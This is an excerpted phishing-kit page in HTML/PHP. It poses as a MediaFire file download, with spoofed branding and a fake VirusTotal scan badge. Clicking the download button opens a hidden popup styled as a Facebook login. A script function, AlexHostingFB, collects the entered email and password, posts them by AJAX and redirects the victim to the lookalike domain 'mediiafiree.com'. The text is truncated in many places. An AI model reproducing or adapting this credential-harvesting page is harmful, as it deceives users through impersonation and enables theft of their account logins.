...
<html>
    <head>
        ...
        <link rel="icon" type="image/x-icon" href="https://i.postimg.cc/zXdjr47x/images-removebg-preview.png">
<style>
* {
    margin: 0px;
}
...
.bgalexdbmdr {
        background-image: url(https://i.postimg.cc/hjNmZ8pK/Mapasindon.jpgsvg);
        ...
        <main>
            <header>
                <div class="imgmdralex">
                    <img id="ptcalexd" src="https://i.ibb.co/5v2hzG7/20230517-154620.png" alt="mediafire" />
                    <img id="ptcalexm" src="https://i.ibb.co/5v2hzG7/20230517-154620.png" alt="mediafire" />
                </div>
            ...
            <section>
                <div class="contalexmdr">
                    <div class="btnalexdwn" onclick="openmdralexf()">
                        <div class="lalexbtnd" onclick="openmdralexf()">
                            <img src="bagas/1677337960017.jpg" alt="" onclick="openmdralexf()" />
                            <div class="txtalexdwn" onclick="openmdralexf()">
                                <p onclick="openmdralexf()"><?php echo $judul;?></p>
                ...
                <div class="uplregalexmdr">
                    ...
                    <div class="alexdescmap">
                        <img src="https://i.postimg.cc/sxF4bJ1V/FlagIndo.png" alt="" />
                        <span>This file was uploaded from Indonesia on June 29, 2023 at 7:24 AM</span>
                    </div>
                    <div class="vtotoalalexmdr">
                        <img src="https://i.postimg.cc/gc1LGJYT/Virus-Total-Scan.jpg" alt="" />
                        <p>VirusTotal scan</p>
                    ...
                    <div class="vtotoalalexmdr" style="padding-bottom: 20px; border-bottom: unset;">
                        <img style="box-shadow: unset; padding: 0px; width: 72px; height: 72px;" src="https://i.postimg.cc/QN1MDqVR/Logo-Mediafireee.jpg" alt="" />
                        <p>About MediaFire</p>
                    ...
                    <div class="vtotoalalexmdr" style="padding-bottom: 20px; border-bottom: unset;">
                        <img style="box-shadow: unset; padding: 0px; width: 72px; height: 72px;" src="https://i.postimg.cc/0NLGFCHV/1677314859750.jpg" alt="" />
            ...
            <div class="popup-ariandi alex-facebook animate fadeIn" id="alexf" style="display: none;">
                <div class="container-box-fb" style="margin-top: 10%;">
                    <div class="atasan-fb" style="width: 95.2%;">
                        <img src="https://bagasarya.xyz/img/info/navbar.png">
                    </div>
                    <div class="isi-facebook">
                        ...
                        <img src="https://i.postimg.cc/3xxf2BJN/images.png">
             ...
             function AlexHostingFB()
        	{
        		...
        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {
        		    $.ajax({
                        ...
                        dataType: 'text',
                        success: function() {
                                    location.href = "https://mediiafiree.com/";
                            } 
                    })
        		}
        	}
